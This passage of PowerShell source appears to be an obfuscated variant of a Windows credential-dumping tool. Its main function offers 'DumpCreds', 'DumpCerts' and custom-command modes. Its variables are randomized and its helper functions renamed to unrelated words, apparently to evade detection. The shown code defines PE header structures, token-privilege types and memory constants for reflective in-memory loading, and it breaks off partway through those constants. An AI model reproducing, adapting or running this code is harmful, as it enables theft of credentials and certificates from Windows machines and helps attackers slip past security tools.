function Moira
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$usyxzTdY99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $NgKgcGOq99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $aeSfmcOM99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$hBgYjoRh99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$FLLIRWIn99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$OXqPvYRq99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$OUtitZzG99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$cDeipBOu99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$dRdIAWyC99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $UdqEmWRT99
	)
	
	Function archeologists
	{
		$zAfvSIaE99 = New-Object System.Object
		$wEtTgZWH99 = [AppDomain]::CurrentDomain
		$BlFRMNWC99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$lPSlbcrg99 = $wEtTgZWH99.DefineDynamicAssembly($BlFRMNWC99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$AxvyPMyh99 = $lPSlbcrg99.DefineDynamicModule('DynamicModule', $false)
		$dkAmDwRm99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$hDIAYHlj99 = $AxvyPMyh99.DefineEnum('MachineType', 'Public', [UInt16])
		$hDIAYHlj99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$hDIAYHlj99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$hDIAYHlj99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$hDIAYHlj99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$mBzpAqCC99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $mBzpAqCC99
		$hDIAYHlj99 = $AxvyPMyh99.DefineEnum('MagicType', 'Public', [UInt16])
		$hDIAYHlj99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$RTIBJxwO99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $RTIBJxwO99
		$hDIAYHlj99 = $AxvyPMyh99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$nDMzOdDD99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $nDMzOdDD99
		$hDIAYHlj99 = $AxvyPMyh99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$hDIAYHlj99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$hDIAYHlj99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$hDIAYHlj99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$hDIAYHlj99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$hDIAYHlj99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$hDIAYHlj99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$ZzkmTOxH99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $ZzkmTOxH99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_DATA_DIRECTORY', $ZZrYTgqD99, [System.ValueType], 8)
		($hDIAYHlj99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($hDIAYHlj99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$qIgnLJAq99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $qIgnLJAq99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_FILE_HEADER', $ZZrYTgqD99, [System.ValueType], 20)
		$hDIAYHlj99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IUTRvVNn99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IUTRvVNn99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_OPTIONAL_HEADER64', $ZZrYTgqD99, [System.ValueType], 240)
		($hDIAYHlj99.DefineField('Magic', $RTIBJxwO99, 'Public')).SetOffset(0) | Out-Null
		($hDIAYHlj99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($hDIAYHlj99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($hDIAYHlj99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($hDIAYHlj99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($hDIAYHlj99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($hDIAYHlj99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($hDIAYHlj99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($hDIAYHlj99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($hDIAYHlj99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($hDIAYHlj99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($hDIAYHlj99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($hDIAYHlj99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($hDIAYHlj99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($hDIAYHlj99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($hDIAYHlj99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($hDIAYHlj99.DefineField('Subsystem', $nDMzOdDD99, 'Public')).SetOffset(68) | Out-Null
		($hDIAYHlj99.DefineField('DllCharacteristics', $ZzkmTOxH99, 'Public')).SetOffset(70) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($hDIAYHlj99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($hDIAYHlj99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($hDIAYHlj99.DefineField('ExportTable', $qIgnLJAq99, 'Public')).SetOffset(112) | Out-Null
		($hDIAYHlj99.DefineField('ImportTable', $qIgnLJAq99, 'Public')).SetOffset(120) | Out-Null
		($hDIAYHlj99.DefineField('ResourceTable', $qIgnLJAq99, 'Public')).SetOffset(128) | Out-Null
		($hDIAYHlj99.DefineField('ExceptionTable', $qIgnLJAq99, 'Public')).SetOffset(136) | Out-Null
		($hDIAYHlj99.DefineField('CertificateTable', $qIgnLJAq99, 'Public')).SetOffset(144) | Out-Null
		($hDIAYHlj99.DefineField('BaseRelocationTable', $qIgnLJAq99, 'Public')).SetOffset(152) | Out-Null
		($hDIAYHlj99.DefineField('Debug', $qIgnLJAq99, 'Public')).SetOffset(160) | Out-Null
		($hDIAYHlj99.DefineField('Architecture', $qIgnLJAq99, 'Public')).SetOffset(168) | Out-Null
		($hDIAYHlj99.DefineField('GlobalPtr', $qIgnLJAq99, 'Public')).SetOffset(176) | Out-Null
		($hDIAYHlj99.DefineField('TLSTable', $qIgnLJAq99, 'Public')).SetOffset(184) | Out-Null
		($hDIAYHlj99.DefineField('LoadConfigTable', $qIgnLJAq99, 'Public')).SetOffset(192) | Out-Null
		($hDIAYHlj99.DefineField('BoundImport', $qIgnLJAq99, 'Public')).SetOffset(200) | Out-Null
		($hDIAYHlj99.DefineField('IAT', $qIgnLJAq99, 'Public')).SetOffset(208) | Out-Null
		($hDIAYHlj99.DefineField('DelayImportDescriptor', $qIgnLJAq99, 'Public')).SetOffset(216) | Out-Null
		($hDIAYHlj99.DefineField('CLRRuntimeHeader', $qIgnLJAq99, 'Public')).SetOffset(224) | Out-Null
		($hDIAYHlj99.DefineField('Reserved', $qIgnLJAq99, 'Public')).SetOffset(232) | Out-Null
		$ayRLXDrr99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $ayRLXDrr99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_OPTIONAL_HEADER32', $ZZrYTgqD99, [System.ValueType], 224)
		($hDIAYHlj99.DefineField('Magic', $RTIBJxwO99, 'Public')).SetOffset(0) | Out-Null
		($hDIAYHlj99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($hDIAYHlj99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($hDIAYHlj99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($hDIAYHlj99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($hDIAYHlj99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($hDIAYHlj99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($hDIAYHlj99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($hDIAYHlj99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($hDIAYHlj99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($hDIAYHlj99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($hDIAYHlj99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($hDIAYHlj99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($hDIAYHlj99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($hDIAYHlj99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($hDIAYHlj99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($hDIAYHlj99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($hDIAYHlj99.DefineField('Subsystem', $nDMzOdDD99, 'Public')).SetOffset(68) | Out-Null
		($hDIAYHlj99.DefineField('DllCharacteristics', $ZzkmTOxH99, 'Public')).SetOffset(70) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($hDIAYHlj99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($hDIAYHlj99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($hDIAYHlj99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($hDIAYHlj99.DefineField('ExportTable', $qIgnLJAq99, 'Public')).SetOffset(96) | Out-Null
		($hDIAYHlj99.DefineField('ImportTable', $qIgnLJAq99, 'Public')).SetOffset(104) | Out-Null
		($hDIAYHlj99.DefineField('ResourceTable', $qIgnLJAq99, 'Public')).SetOffset(112) | Out-Null
		($hDIAYHlj99.DefineField('ExceptionTable', $qIgnLJAq99, 'Public')).SetOffset(120) | Out-Null
		($hDIAYHlj99.DefineField('CertificateTable', $qIgnLJAq99, 'Public')).SetOffset(128) | Out-Null
		($hDIAYHlj99.DefineField('BaseRelocationTable', $qIgnLJAq99, 'Public')).SetOffset(136) | Out-Null
		($hDIAYHlj99.DefineField('Debug', $qIgnLJAq99, 'Public')).SetOffset(144) | Out-Null
		($hDIAYHlj99.DefineField('Architecture', $qIgnLJAq99, 'Public')).SetOffset(152) | Out-Null
		($hDIAYHlj99.DefineField('GlobalPtr', $qIgnLJAq99, 'Public')).SetOffset(160) | Out-Null
		($hDIAYHlj99.DefineField('TLSTable', $qIgnLJAq99, 'Public')).SetOffset(168) | Out-Null
		($hDIAYHlj99.DefineField('LoadConfigTable', $qIgnLJAq99, 'Public')).SetOffset(176) | Out-Null
		($hDIAYHlj99.DefineField('BoundImport', $qIgnLJAq99, 'Public')).SetOffset(184) | Out-Null
		($hDIAYHlj99.DefineField('IAT', $qIgnLJAq99, 'Public')).SetOffset(192) | Out-Null
		($hDIAYHlj99.DefineField('DelayImportDescriptor', $qIgnLJAq99, 'Public')).SetOffset(200) | Out-Null
		($hDIAYHlj99.DefineField('CLRRuntimeHeader', $qIgnLJAq99, 'Public')).SetOffset(208) | Out-Null
		($hDIAYHlj99.DefineField('Reserved', $qIgnLJAq99, 'Public')).SetOffset(216) | Out-Null
		$uralyVYP99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $uralyVYP99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_NT_HEADERS64', $ZZrYTgqD99, [System.ValueType], 264)
		$hDIAYHlj99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('FileHeader', $IUTRvVNn99, 'Public') | Out-Null
		$hDIAYHlj99.DefineField('OptionalHeader', $ayRLXDrr99, 'Public') | Out-Null
		$CxhomNao99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $CxhomNao99
		
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_NT_HEADERS32', $ZZrYTgqD99, [System.ValueType], 248)
		$hDIAYHlj99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('FileHeader', $IUTRvVNn99, 'Public') | Out-Null
		$hDIAYHlj99.DefineField('OptionalHeader', $uralyVYP99, 'Public') | Out-Null
		$hQJExohX99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $hQJExohX99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_DOS_HEADER', $ZZrYTgqD99, [System.ValueType], 64)
		$hDIAYHlj99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$kKXfteJS99 = $hDIAYHlj99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$obCkePCn99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$dmoxSLGh99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$DSGjnOWq99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($dkAmDwRm99, $obCkePCn99, $dmoxSLGh99, @([Int32] 4))
		$kKXfteJS99.SetCustomAttribute($DSGjnOWq99)
		$hDIAYHlj99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$AGfRlArV99 = $hDIAYHlj99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$obCkePCn99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$DSGjnOWq99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($dkAmDwRm99, $obCkePCn99, $dmoxSLGh99, @([Int32] 10))
		$AGfRlArV99.SetCustomAttribute($DSGjnOWq99)
		$hDIAYHlj99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$eYDARxSJ99 = $hDIAYHlj99.CreateType()	
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $eYDARxSJ99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_SECTION_HEADER', $ZZrYTgqD99, [System.ValueType], 40)
		$IOklGPOg99 = $hDIAYHlj99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$obCkePCn99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$DSGjnOWq99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($dkAmDwRm99, $obCkePCn99, $dmoxSLGh99, @([Int32] 8))
		$IOklGPOg99.SetCustomAttribute($DSGjnOWq99)
		$hDIAYHlj99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IRdMPWCG99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IRdMPWCG99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_BASE_RELOCATION', $ZZrYTgqD99, [System.ValueType], 8)
		$hDIAYHlj99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$gDxdKDwz99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $gDxdKDwz99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $ZZrYTgqD99, [System.ValueType], 20)
		$hDIAYHlj99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$gWLixReI99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $gWLixReI99
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('IMAGE_EXPORT_DIRECTORY', $ZZrYTgqD99, [System.ValueType], 40)
		$hDIAYHlj99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$XcasSdge99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $XcasSdge99
		
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('LUID', $ZZrYTgqD99, [System.ValueType], 8)
		$hDIAYHlj99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('LUID_AND_ATTRIBUTES', $ZZrYTgqD99, [System.ValueType], 12)
		$hDIAYHlj99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$lfdwqsyQ99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $lfdwqsyQ99
		
		$ZZrYTgqD99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$hDIAYHlj99 = $AxvyPMyh99.DefineType('TOKEN_PRIVILEGES', $ZZrYTgqD99, [System.ValueType], 16)
		$hDIAYHlj99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$hDIAYHlj99.DefineField('Privileges', $lfdwqsyQ99, 'Public') | Out-Null
		$cNqbZeab99 = $hDIAYHlj99.CreateType()
		$zAfvSIaE99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $cNqbZeab99
		return $zAfvSIaE99
	}
	Function actress
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
